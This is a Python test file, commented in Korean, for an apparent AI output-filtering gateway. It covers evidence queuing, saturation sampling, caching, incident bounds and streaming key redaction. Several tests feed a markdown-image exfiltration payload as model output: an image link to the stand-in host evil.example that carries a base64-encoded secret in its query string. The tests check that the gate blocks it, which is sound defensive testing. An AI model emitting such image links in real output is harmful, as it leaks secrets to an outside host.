"""Epic 23 — 인라인 성능·증적 비동기·스트리밍 (NFR-P1·L3·L5)."""
import queue

from app import evidence_writer, hotcache, incidents

OUT_AGENTS = ["d2-03", "d1-06"]                     # 출력 관문: API 키 무해화(transform) · 마크다운 이미지 유출(block)


def test_async_evidence_is_queued_then_readable(client):
    r = client.post("/v1/judge:batch", json={"gate": "output", "agents": OUT_AGENTS,
                                             "request": {"output": "키는 AKIAIOSFODNN7EXAMPLE 입니다"}}).json()
    assert r["verdict"] == "transform" and r["evidence"] == "queued"
    ev = client.get("/v1/evidence", params={"kind": "gate", "limit": 20}).json()["items"]   # 읽기 전 flush → 바로 보인다
    assert any(e["refId"] == r["traceId"] for e in ev)
    fs = client.get("/v1/findings", params={"trace": r["traceId"]}).json()["items"]
    assert {f["agentId"] if "agentId" in f else f["agent"]["id"] for f in fs} >= {"d2-03"}
    assert client.get("/v1/evidence:verify").json()["ok"]


def test_saturation_degrades_to_sampling_and_recovers(client, monkeypatch):
    small: queue.Queue = queue.Queue(maxsize=10)
    monkeypatch.setattr(evidence_writer, "_q", small)
    monkeypatch.setattr(evidence_writer, "_ensure_thread", lambda: None)          # 적재기를 멈춘 상태 = 포화 재현
    monkeypatch.setattr(evidence_writer.settings, "evidence_sample_every", 5)
    base = dict(evidence_writer.STATS)

    def item(v, i):
        return evidence_writer.Item("default", v, [("gate", f"sat-{v}-{i}", {"verdict": v, "test": "saturation"})])

    res = [evidence_writer.submit(item("allow", i)) for i in range(20)]
    assert res[:8] == ["queued"] * 8 and evidence_writer.STATS["degraded"]            # 80% 도달 → 표본 적재
    assert res.count("sampled_out") >= 8                                              # allow 는 5 건 중 1 건만
    assert evidence_writer.submit(item("block", 0)) in ("queued", "dropped")          # 위험 판정은 표본 제외 없음
    batch = []
    while not small.empty():
        batch.append(small.get_nowait())
        small.task_done()
    evidence_writer._write(batch)                                                     # 적재기 재개 → 대기열 비움
    assert evidence_writer.submit(item("allow", 99)) == "queued" and not evidence_writer.STATS["degraded"]
    evidence_writer._write([small.get_nowait()])
    small.task_done()
    evs = [e["body"] for e in client.get("/v1/evidence", params={"kind": "evidence", "limit": 10}).json()["items"]]
    rec = next(e for e in evs if e["event"] == "sampling_recovered")
    assert rec["sampledOut"] >= 8 and any(e["event"] == "sampling_degraded" for e in evs)
    assert evidence_writer.STATS["sampledOut"] - base["sampledOut"] >= 8
    notes = client.get("/v1/notifications", params={"hours": 1}).json()["items"]
    assert any(n["kind"] == "증적 강등" for n in notes)


def test_binding_cache_invalidates_on_local_writes(client):
    target = "perf.cache"
    client.post("/v1/profiles/minimal-visibility:apply", json={"target": target})
    a = client.post("/v1/judge:batch", json={"gate": "output", "target": target, "request": {"output": "안녕"}}).json()
    client.post("/v1/profiles/chatbot-baseline:apply", json={"target": target})       # 같은 프로세스 쓰기 → 즉시 반영
    b = client.post("/v1/judge:batch", json={"gate": "output", "target": target, "request": {"output": "안녕"}}).json()
    assert a["profile"] == "minimal-visibility" and b["profile"] == "chatbot-baseline"
    assert hotcache.STATS["invalidations"] > 0


def test_incident_row_size_is_bounded(client, monkeypatch):
    monkeypatch.setattr(incidents, "KEEP", 3)
    body = {"gate": "output", "agents": OUT_AGENTS, "request": {
        "subject": {"principal": {"id": "perf.attacker"}},
        "output": "![x](https://evil.example/p.png?d=c2VjcmV0X2tleT1zay1hbnQtYXBpMDM)"}}
    traces = [client.post("/v1/judge:batch", json=body).json()["traceId"] for _ in range(5)]
    inc = next(i for i in client.get("/v1/incidents").json()["items"] if traces[-1] in i["traceIds"])
    assert len(inc["traceIds"]) == 3 and inc["traceCount"] >= 5 and inc["findingCount"] >= 5


def test_repeat_attacks_do_not_lock_incident_row_in_request(client):
    """Epic 66 — 같은 주체 반복 공격: 요청 스레드는 사건 행을 갱신하지 않고, 증적 작성기가 묶음마다 사건당 한 번 갱신한다."""
    import threading

    from sqlalchemy import event

    from app import db
    body = {"gate": "output", "agents": OUT_AGENTS, "request": {
        "subject": {"principal": {"id": "perf.repeat"}},
        "output": "![x](https://evil.example/p.png?d=c2VjcmV0X2tleT1zay1hbnQtYXBpMDM)"}}
    first = client.post("/v1/judge:batch", json=body).json()
    seen: list[tuple[str, str]] = []

    def spy(conn, cursor, statement, *_):
        if statement.lstrip().upper().startswith("UPDATE INCIDENTS"):
            seen.append((threading.current_thread().name, statement))
    event.listen(db.engine, "before_cursor_execute", spy)
    try:
        traces = [client.post("/v1/judge:batch", json=body).json()["traceId"] for _ in range(4)]
        evidence_writer.flush()
    finally:
        event.remove(db.engine, "before_cursor_execute", spy)
    assert seen and {name for name, _ in seen} == {"evidence-writer"}                  # 요청 경로에는 사건 행 잠금 없음
    inc = client.get(f"/v1/incidents/{first['incidents'][0]}").json()
    assert set(traces) <= set(inc["traceIds"]) and inc["traceCount"] >= 5


def test_stream_chunks_redact_across_boundary_and_stop_on_block(client):
    chunks = ["주문 조회 결과를 안내드립니다. " * 6 + "임시 키는 AKIAIOSF", "ODNN7EXAMPLE 이며 곧 폐기됩니다. ", "감사합니다."]
    held, emitted, sid = "", [], None
    for i, ch in enumerate(chunks):
        r = client.post("/v1/judge:stream", json={"agents": OUT_AGENTS, "streamId": sid, "seq": i, "chunk": ch,
                                                  "held": held, "final": i == len(chunks) - 1}).json()
        assert not r["stop"] and r["latencyMs"] <= r["budgetMs"] == 150
        sid, held = r["streamId"], r["held"]
        emitted.append(r["emit"])
        assert "AKIAIOSF" not in r["emit"]                                             # 경계에 걸친 키 앞부분은 보류
    text = "".join(emitted)
    assert "AKIAIOSFODNN7EXAMPLE" not in text and text.endswith("감사합니다.") and held == ""
    assert text.startswith("주문 조회 결과를 안내드립니다.")
    r = client.post("/v1/judge:stream", json={"agents": OUT_AGENTS, "seq": 0, "chunk":
                                              "참고 이미지: ![x](https://evil.example/p.png?d=c2VjcmV0X2tleT1zay1hbnQtYXBpMDM)"}).json()
    assert r["stop"] and r["verdict"] == "block" and r["emit"] == "" and r["hits"][0]["agent"] == "d1-06"
    ev = client.get("/v1/evidence", params={"kind": "gate", "limit": 10}).json()["items"]
    assert any((e["body"].get("stream") or {}).get("id") == sid for e in ev)
